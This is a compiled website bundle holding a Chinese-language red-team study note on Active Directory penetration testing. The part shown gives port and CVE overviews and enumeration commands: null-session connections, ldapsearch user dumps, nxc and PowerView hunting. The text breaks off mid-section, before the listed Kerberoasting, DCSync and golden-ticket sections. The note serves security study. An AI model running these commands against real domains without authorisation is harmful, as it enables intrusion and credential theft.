"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[9294],{3992:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>h,contentTitle:()=>c,default:()=>x,frontMatter:()=>d,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"Cyber-Security/Red_Team/AD_Pentest","title":"AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66","description":"\u5b78\u7fd2\u9023\u7d50","source":"@site/docs/Cyber-Security/Red_Team/AD_Pentest.md","sourceDirName":"Cyber-Security/Red_Team","slug":"/Cyber-Security/Red_Team/AD_Pentest","permalink":"/docs/Cyber-Security/Red_Team/AD_Pentest","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"sidebar_label":"\u7d05\u968a\u5b89\u5168 | AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"},"sidebar":"tutorialSidebar","previous":{"title":"Red Team \u7d05\u968a\u5b89\u5168","permalink":"/docs/category/red-team-\u7d05\u968a\u5b89\u5168"},"next":{"title":"\u7d05\u968a\u5b89\u5168 | Linux \u5f8c\u6ef2\u900f","permalink":"/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation"}}');var l=s(4848),r=s(8453);const d={sidebar_label:"\u7d05\u968a\u5b89\u5168 | AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"},c="AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66",h={},o=[{value:"Microsoft AD \u8a13\u7df4\u8ab2\u7a0b",id:"microsoft-ad-\u8a13\u7df4\u8ab2\u7a0b",level:2},{value:"DC \u7684\u529f\u80fd\uff1a",id:"dc-\u7684\u529f\u80fd",level:2},{value:"Nmap",id:"nmap",level:2},{value:"\u5e38\u898b\u958b\u653e Port \u8207\u5176\u5c0d\u61c9\u6f0f\u6d1e",id:"\u5e38\u898b\u958b\u653e-port-\u8207\u5176\u5c0d\u61c9\u6f0f\u6d1e",level:3},{value:"Nmap Scripting Engine (NSE)\uff1a",id:"nmap-scripting-engine-nse",level:3},{value:"Windows \u74b0\u5883\u4e0b\u7684\u679a\u8209",id:"windows-\u74b0\u5883\u4e0b\u7684\u679a\u8209",level:2},{value:"PowerShell Cmdlet\uff1a",id:"powershell-cmdlet",level:3},{value:"LDAP \uff1a",id:"ldap-",level:3},{value:"Linux LDAP Recon\uff1a",id:"linux-ldap-recon",level:4},{value:"Domain Controller",id:"domain-controller",level:3},{value:"Powerview",id:"powerview",level:3},{value:"SMB",id:"smb",level:3},{value:"RPC (Port 135)",id:"rpc-port-135",level:4},{value:"GPO enumeration",id:"gpo-enumeration",level:3},{value:"GPO",id:"gpo",level:4},{value:"GetUserSPNs[.]py",id:"getuserspnspy",level:3},{value:"Kerbrute",id:"kerbrute",level:3},{value:"Windows ADRecon.ps1",id:"windows-adreconps1",level:3},{value:"BloodHoundAD",id:"bloodhoundad",level:3},{value:"SMB",id:"smb-1",level:2},{value:"psexec",id:"psexec",level:3},{value:"cme/nxc",id:"cmenxc",level:3},{value:"\u7db2\u8def\u82b3\u9130",id:"\u7db2\u8def\u82b3\u9130",level:3},{value:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",id:"\u639b\u8f09\u9060\u7aef\u78c1\u789f",level:3},{value:"RDP \u9060\u7aef\u684c\u9762",id:"rdp-\u9060\u7aef\u684c\u9762",level:2},{value:"Windows",id:"windows",level:3},{value:"Abuse Restricted Admin Mode",id:"abuse-restricted-admin-mode",level:4},{value:"Linux",id:"linux",level:3},{value:"WMI",id:"wmi",level:2},{value:"Pass the Hash",id:"pass-the-hash",level:3},{value:"WINRM",id:"winrm",level:2},{value:"PowerShell Remoting(Windows Remote Management)",id:"powershell-remotingwindows-remote-management",level:3},{value:"DCOM",id:"dcom",level:2},{value:"SSH",id:"ssh",level:2},{value:"MSSQL",id:"mssql",level:2},{value:"Exchange",id:"exchange",level:2},{value:"SCCM",id:"sccm",level:2},{value:"LLMNR &amp; NBT-NS Poisoning",id:"llmnr--nbt-ns-poisoning",level:2},{value:"Linux",id:"linux-1",level:3},{value:"Windows",id:"windows-1",level:3},{value:"KrbRelayUp",id:"krbrelayup",level:2},{value:"DavRelayUp",id:"davrelayup",level:2},{value:"Password Spraying(\u5bc6\u78bc\u5674\u7051)",id:"password-spraying\u5bc6\u78bc\u5674\u7051",level:2},{value:"Linux",id:"linux-2",level:3},{value:"Windows",id:"windows-2",level:3},{value:"SMB Relay / NTLM Relay",id:"smb-relay--ntlm-relay",level:2},{value:"Kerberoasting",id:"kerberoasting",level:2},{value:"AS-REP Roasting",id:"as-rep-roasting",level:2},{value:"Kerberos Delegation",id:"kerberos-delegation",level:2},{value:"ACL Abuse",id:"acl-abuse",level:2},{value:"ACL Enum",id:"acl-enum",level:3},{value:"DcSync",id:"dcsync",level:2},{value:"Dumping Hash",id:"dumping-hash",level:3},{value:"Generating Golden ticket",id:"generating-golden-ticket",level:3},{value:"Attacking Domain Trust",id:"attacking-domain-trust",level:2}];function t(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"ad-\u7db2\u57df\u6ef2\u900f\u6e2c\u8a66",children:"AD \u7db2\u57df\u6ef2\u900f\u6e2c\u8a66"})}),"\n",(0,l.jsx)(n.p,{children:"\u5b78\u7fd2\u9023\u7d50"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.ired.team/offensive-security/lateral-movement",children:"\u6a6b\u5411\u79fb\u52d5"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67",children:"[\u5167\u7db2\u6ef2\u900f]Pass the Hash(PtH)\u653b\u64ca\u624b\u6cd5\u53ca\u9632\u79a6\u3001\u5075\u6e2c\u63aa\u65bd"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://tech-blog.cymetrics.io/posts/zet/purple-man-my-superman/",children:"\u904a\u8d70\u7d05\u968a\u8207\u85cd\u968a\uff1aPurple man \u6211\u7684\u8d85\u4eba"})}),"\n",(0,l.jsxs)(n.li,{children:["Active Directory","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/geeksniper/active-directory-pentest",children:"https://github.com/geeksniper/active-directory-pentest"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://zer1t0.gitlab.io/posts/attacking_ad/",children:"https://zer1t0.gitlab.io/posts/attacking_ad/"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://hideandsec.sh/books/cheatsheets-82c/page/active-directory",children:"https://hideandsec.sh/books/cheatsheets-82c/page/active-directory"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["NXC\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/netexec",children:"https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/netexec"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.netexec.wiki/",children:"https://www.netexec.wiki/"})}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.a,{href:"https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/",children:"https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/"}),"\n:::"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h1,{id:"ad-\u57fa\u790e\u77e5\u8b58",children:"AD \u57fa\u790e\u77e5\u8b58"}),"\n",(0,l.jsx)(n.h2,{id:"microsoft-ad-\u8a13\u7df4\u8ab2\u7a0b",children:"Microsoft AD \u8a13\u7df4\u8ab2\u7a0b"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://learn.microsoft.com/zh-tw/training/browse/?roles=security-engineer%2Csecurity-operations-analyst&expanded=security&subjects=security",children:"\u7cfb\u7d71\u8cc7\u8a0a\u5b89\u5168"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://learn.microsoft.com/zh-tw/training/paths/active-directory-domain-services/?source=recommendations",children:"AD"})}),"\n"]}),"\n",(0,l.jsx)(n.h1,{id:"dc",children:"DC"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"DC (Domain Controller)"}),"\n",(0,l.jsx)(n.li,{children:"RODC (Read-Only Domain Controller)"}),"\n",(0,l.jsxs)(n.li,{children:["\u52a0\u5165 AD","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"DNS \u6307\u5411 AD"}),"\n",(0,l.jsx)(n.li,{children:"\u5c07\u7cfb\u7d71\u52a0\u5165 AD"}),"\n",(0,l.jsx)(n.li,{children:"\u4f7f\u7528\u7db2\u57df\u5e33\u865f\u767b\u5165"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"DC \u8207 DNS \u901a\u5e38\u662f\u540c\u4e00\u53f0"}),"\n",(0,l.jsx)(n.li,{children:"DC common port list\uff1a"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"- Port 389 LDAP\n- Port 636 LDAP over SSL\n- Port 88 Kerberos Authentication\n- Port 3268 Global catalog Search\n- Port 3269 Global catalog LDAP over SSL\n"})}),"\n",(0,l.jsx)(n.h2,{id:"dc-\u7684\u529f\u80fd",children:"DC \u7684\u529f\u80fd\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u8eab\u4efd\u9a57\u8b49: Kerberos\u3001NTLM..."}),"\n",(0,l.jsx)(n.li,{children:"\u6388\u6b0a: \u8a2a\u554f\u63a7\u5236\u3001\u7fa4\u7d44\u539f\u5247\u7684\u61c9\u7528\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u5e33\u6236\u7ba1\u7406: \u4f7f\u7528\u8005\u3001\u96fb\u8166\u3001\u7fa4\u7d44\u7684\u5efa\u7acb\u3001\u4fee\u6539\u548c\u522a\u9664\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u6642\u9593\u540c\u6b65: \u7db2\u57df\u5167\u7684\u6642\u9593\u540c\u6b65\u670d\u52d9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u6191\u8b49\u670d\u52d9 (AD CS)"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"DC \u7684\u5b89\u5168\u8003\u91cf\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5be6\u9ad4\u5b89\u5168: \u4fdd\u8b77 DC \u7684\u5be6\u9ad4\u5b58\u53d6\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u4f5c\u696d\u7cfb\u7d71\u5b89\u5168: \u5b9a\u671f\u66f4\u65b0\u3001\u5b89\u5168\u914d\u7f6e\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u6700\u5c0f\u5316\u5b89\u88dd: \u50c5\u5b89\u88dd\u5fc5\u8981\u7684\u670d\u52d9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u76e3\u63a7\u8207\u65e5\u8a8c: \u76e3\u63a7 DC \u7684\u5b89\u5168\u4e8b\u4ef6\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h1,{id:"recon",children:"Recon"}),"\n",(0,l.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,l.jsx)(n.h3,{id:"\u5e38\u898b\u958b\u653e-port-\u8207\u5176\u5c0d\u61c9\u6f0f\u6d1e",children:"\u5e38\u898b\u958b\u653e Port \u8207\u5176\u5c0d\u61c9\u6f0f\u6d1e"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"53/tcp/udp (domain): DNS \u670d\u52d9\uff0c\u53ef\u80fd\u5b58\u5728 DNS Zone Transfer \u6f0f\u6d1e\u3002"}),"\n",(0,l.jsx)(n.li,{children:"123/udp (ntp): NTP \u670d\u52d9\uff0c\u53ef\u80fd\u7528\u65bc\u6642\u9593\u540c\u6b65\u653b\u64ca\u3002"}),"\n",(0,l.jsxs)(n.li,{children:["135/tcp (msrpc)\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u63d0\u4f9b\u5fae\u8edf\u7684\u9060\u7aef\u904e\u7a0b\u547c\u53eb\uff08Microsoft RPC\uff09\u670d\u52d9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u53ef\u80fd\u88ab\u7528\u65bc\u9060\u7aef\u7a0b\u5f0f\u78bc\u57f7\u884c\u6f0f\u6d1e\u5229\u7528\uff08\u5982 MS08-067\uff09\u3002"}),"\n",(0,l.jsx)(n.li,{children:"MS03-026 (Blaster/Lovsan \u8815\u87f2):"}),"\n",(0,l.jsx)(n.li,{children:"\u6f0f\u6d1e: DCOM RPC \u4ecb\u9762\u4e2d\u7684\u7de9\u885d\u5340\u6ea2\u4f4d\u6f0f\u6d1e (CVE-2003-0352)\u3002"}),"\n",(0,l.jsx)(n.li,{children:"MS08-067 (Conficker \u8815\u87f2):"}),"\n",(0,l.jsxs)(n.li,{children:["PrintNightmare (CVE-2021-1675, CVE-2021-34527):","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u6f0f\u6d1e: Windows \u5217\u5370\u591a\u5de5\u7de9\u885d\u8655\u7406\u5668\u670d\u52d9 (Print Spooler) \u4e2d\u7684\u591a\u500b\u6f0f\u6d1e\uff0c\u6d89\u53ca\u5176 RPC \u4ecb\u9762\u3002"}),"\n",(0,l.jsx)(n.li,{children:"\u5f71\u97ff: \u5141\u8a31\u7d93\u904e\u8eab\u4efd\u9a57\u8b49\u7684\u4f4e\u6b0a\u9650\u4f7f\u7528\u8005\uff08\u751a\u81f3\u5728\u67d0\u4e9b\u60c5\u6cc1\u4e0b\u662f\u672a\u7d93\u8eab\u4efd\u9a57\u8b49\u7684\u653b\u64ca\u8005\uff09\u900f\u904e RPC \u547c\u53eb\uff08\u4f8b\u5982 RpcAddPrinterDriverEx()) \u9060\u7aef\u57f7\u884c\u7a0b\u5f0f\u78bc\uff08SYSTEM \u6b0a\u9650\uff09\u6216\u9032\u884c\u672c\u5730\u6b0a\u9650\u63d0\u5347\u3002\u5118\u7ba1\u653b\u64ca\u53ef\u80fd\u900f\u904e SMB (445) \u6216\u76f4\u63a5 RPC \u9032\u884c\uff0c\u4f46\u6838\u5fc3\u554f\u984c\u5728\u65bc Spooler \u670d\u52d9\u7684 RPC \u8655\u7406\u908f\u8f2f\u3002"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"DCOM \u5f37\u5236\u57f7\u884c\u8b8a\u66f4\u76f8\u95dc (\u4f8b\u5982 CVE-2021-26414)"}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"137/udp (netbios-ns): NetBIOS Name Service\uff0c\u53ef\u80fd\u6d29\u6f0f\u4e3b\u6a5f\u540d\u7a31\u8cc7\u8a0a\u3002"}),"\n",(0,l.jsx)(n.li,{children:"138/udp (netbios-dgm): NetBIOS Datagram Service\u3002"}),"\n",(0,l.jsxs)(n.li,{children:["139/tcp (netbios-ssn) & 445/tcp (microsoft-ds)\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u63d0\u4f9b SMB \u670d\u52d9\uff0c\u53ef\u80fd\u7528\u65bc\u6a94\u6848\u5171\u7528\u548c\u8eab\u4efd\u9a57\u8b49\u3002\u662f\u975e\u5e38\u91cd\u8981\u7684\u76ee\u6a19\uff0c\u53ef\u4ee5\u5617\u8a66\u6191\u8b49\u653b\u64ca\u3001\u6f0f\u6d1e\u6216\u5171\u4eab\u6a94\u6848\u679a\u8209\u3002"}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"SMBv2 Message signing enabled but not required"})," --\x3e ntlmrelay"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"593/tcp (ncacn_ip_tcp): MSRPC Endpoint Mapper Port\uff0c\u8207 135 \u985e\u4f3c\u3002"}),"\n",(0,l.jsxs)(n.li,{children:["3389/tcp (ms-wbt-server)\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u9060\u7aef\u684c\u9762\u5354\u5b9a (RDP) \u670d\u52d9\u3002"}),"\n",(0,l.jsxs)(n.li,{children:["\u53ef\u4ee5\u5617\u8a66\u66b4\u529b\u7834\u89e3\u6216\u6f0f\u6d1e\uff08\u5982 ",(0,l.jsx)(n.a,{href:"https://github.com/Ekultek/BlueKeep",children:"BlueKeep"}),"\uff09\u3002"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.li,{children:"49152+ /tcp (Dynamic RPC ports): \u52d5\u614b RPC Port \u7bc4\u570d\uff0c\u8207 MSRPC \u76f8\u95dc\u3002"}),"\n",(0,l.jsx)(n.li,{children:"5985/tcp & 5986/tcp (wsman): WinRM (PowerShell Remoting) \u670d\u52d9\u3002"}),"\n",(0,l.jsx)(n.li,{children:"9389/tcp (adws): Active Directory Web Services\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"nmap-scripting-engine-nse",children:"Nmap Scripting Engine (NSE)\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"smb-vuln-* \u8173\u672c\u7cfb\u5217 (EternalBlue, WannaCry \u7b49\u6f0f\u6d1e\u6aa2\u6e2c)"}),"\n",(0,l.jsx)(n.li,{children:"smb-enum-shares \u8173\u672c (\u679a\u8209 SMB \u5171\u4eab)"}),"\n",(0,l.jsx)(n.li,{children:"smb-os-discovery \u8173\u672c (\u5075\u6e2c\u4f5c\u696d\u7cfb\u7d71\u7248\u672c)"}),"\n",(0,l.jsx)(n.li,{children:"ldap-* \u8173\u672c\u7cfb\u5217 (LDAP \u76f8\u95dc\u7684\u5075\u67e5)"}),"\n",(0,l.jsx)(n.li,{children:"winrm-* \u8173\u672c\u7cfb\u5217 (WinRM \u76f8\u95dc\u7684\u5075\u67e5)"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"windows-\u74b0\u5883\u4e0b\u7684\u679a\u8209",children:"Windows \u74b0\u5883\u4e0b\u7684\u679a\u8209"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u67e5\u8a62 Local User","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net user"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net user <username>"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u8a62 password policy","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"net accounts"}),"\n",(0,l.jsx)(n.img,{src:"https://hackmd.io/_uploads/BJQR6SNqke.png",alt:"image"})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u8a62 Domain User","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net user /domain"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net user {username} /domain"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u8a62\u6b0a\u9650","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"whoami /priv"})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u67e5\u8a62\u9810\u8a2d\u9ad8\u6b0a\u9650\u7fa4\u7d44","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"net groups /domain"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'net groups "Domain Admins" /domain'})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'net groups "Schema Admins" /domain'})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'net groups "Enterprise Admins" /domain'})}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5229\u7528 null session \u505a\u5e33\u865f\u679a\u8209/\u8eab\u5206\u9a57\u8b49\u932f\u8aa4","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u5efa\u7acb null session\uff1a",(0,l.jsx)(n.code,{children:'net use \\\\DC01\\ipc$ "" /u:""'})]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:'net use \\\\DC01\\ipc$ "" /u:guest'}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u53ef\u80fd\u51fa\u73fe\uff1a",(0,l.jsx)(n.code,{children:"This user can't sign in because this account is currently disabled."})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u5e36\u6709 password \u6642\uff1a",(0,l.jsx)(n.code,{children:'net use \\\\DC01\\ipc$ "password" /u:guest'}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u53ef\u80fd\u51fa\u73fe\uff1a",(0,l.jsx)(n.code,{children:"The user name or password is incorrect."})]}),"\n",(0,l.jsxs)(n.li,{children:["\u6216\u662f\uff1a",(0,l.jsx)(n.code,{children:"The referenced account is currently locked out and may not be logged on to."})]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"powershell-cmdlet",children:"PowerShell Cmdlet\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-ADGroup"}),"\uff1a\u67e5\u8a62\u7db2\u57df\u7fa4\u7d44\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-ADComputer"}),"\uff1a\u67e5\u8a62\u7db2\u57df\u96fb\u8166\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-ADObject"}),"\uff1a\u67e5\u8a62 AD \u7269\u4ef6\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetDomain"}),"\uff1a\u67e5\u8a62\u7db2\u57df\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetForest"}),"\uff1a\u67e5\u8a62\u6a39\u7cfb\u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetOU"}),"\uff1a\u67e5\u8a62\u7d44\u7e54\u55ae\u4f4d (OU) \u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetGPO"}),"\uff1a\u67e5\u8a62\u7fa4\u7d44\u539f\u5247\u7269\u4ef6 (GPO) \u8cc7\u8a0a\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetLocalGroupMember"}),"\uff1a\u67e5\u8a62\u672c\u6a5f\u7fa4\u7d44\u6210\u54e1\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-NetGroupMember"}),"\uff1a\u67e5\u8a62\u7db2\u57df\u7fa4\u7d44\u6210\u54e1\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-MpComputerStatus"}),"\uff1a\u89c0\u5bdf\u9632\u6bd2\u72c0\u614b"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"}),"\uff1aAppLockerl"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"ldap-",children:"LDAP \uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["DN",":Distinguish"," Name"]}),"\n",(0,l.jsx)(n.li,{children:"CN: Common Name"}),"\n",(0,l.jsxs)(n.li,{children:["OU",":Organization"," Unit Name"]}),"\n",(0,l.jsx)(n.li,{children:"DC: Domain Componet"}),"\n"]}),"\n",(0,l.jsx)(n.h4,{id:"linux-ldap-recon",children:"Linux LDAP Recon\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["tools\uff1a",(0,l.jsx)(n.a,{href:"https://github.com/ropnop/windapsearch",children:"windapsearch.py"}),", ldapsearch, ",(0,l.jsx)(n.a,{href:"https://github.com/dirkjanm/ldapdomaindump",children:"ldapdomaindump.py"})]}),"\n",(0,l.jsxs)(n.li,{children:["\u6c92\u6709 password\uff0c\u6709\u5e33\u865f\u6642\uff1a","\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:'ldapsearch -H ldap://<ip> -x -b "DC=...,DC=..." -s sub "*"'})}),"\n",(0,l.jsxs)(n.li,{children:["\u641c\u5c0b password policy\uff1a",(0,l.jsx)(n.code,{children:'ldapsearch -H ldap://<ip> -x -b "DC=...,DC=..." -s sub "*" | grep -m 1 -B 10 pwdHistoryLength'})]}),"\n",(0,l.jsxs)(n.li,{children:["\u7372\u53d6 Domain user lists\uff1a",(0,l.jsx)(n.code,{children:'ldapsearch -H ldap://<ip> -x -b "DC=...,DC=..." -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "'})]}),"\n"]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\u6709password\uff1a",(0,l.jsx)(n.code,{children:"ldapsearch -x -H ldap://<ip> -D 'user@domain' -w 'password' -b 'dc=<domain_name>,dc=<top_domain>' '(ObjectClass=user)'"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"nxc ldap -u <user> -p <password>"})," --\x3e NTLM \u9a57\u8b49(NXC \u9ed8\u8a8d\u9a57\u8b49\u65b9\u6cd5)\uff0c\u8981\u555f\u7528 Protocol transition \u624d\u80fd\u7528 NTLM \u5b58\u53d6 kerberos \u9a57\u8b49\u7684\u670d\u52d9\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"nxc ldap -u <user> -p <password> -k"})," --\x3e \u6307\u5b9a\u7528 Kerberos \u9a57\u8b49(Protocol transition \u95dc\u9589\u6642\u53ef\u4ee5\u7528)"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"domain-controller",children:"Domain Controller"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"echo %logonserver%"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.code,{children:"nltest /dclist:<domain>"})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"powerview",children:"Powerview"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\u7528\u4e4b\u524d\u5148 import\uff1a",(0,l.jsx)(n.code,{children:"import-module .\\PowerView.ps1"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Password Policy\uff1a",(0,l.jsx)(n.code,{children:"Get-DomainPolicy"})]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Invoke-UserHunter"}),"\uff1aPowerView \u4e2d\u7684\u8173\u672c\uff0c\u7528\u65bc\u5c0b\u627e\u7db2\u57df\u7ba1\u7406\u54e1\u767b\u5165\u7684\u7cfb\u7d71\u3002"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.code,{children:"Invoke-ProcessHunter"}),"\uff1aPowerView \u4e2d\u7684\u8173\u672c\uff0c\u7528\u65bc\u5c0b\u627e\u7279\u5b9a\u9032\u7a0b (\u4f8b\u5982 Mimikatz) \u904b\u884c\u7684\u7cfb\u7d71\u3002"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"smb",children:"SMB"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"ExternalBlue, WannaCry"}),"\n",(0,l.jsx)(n.li,{children:"port\uff1a139 (NetBIOS), 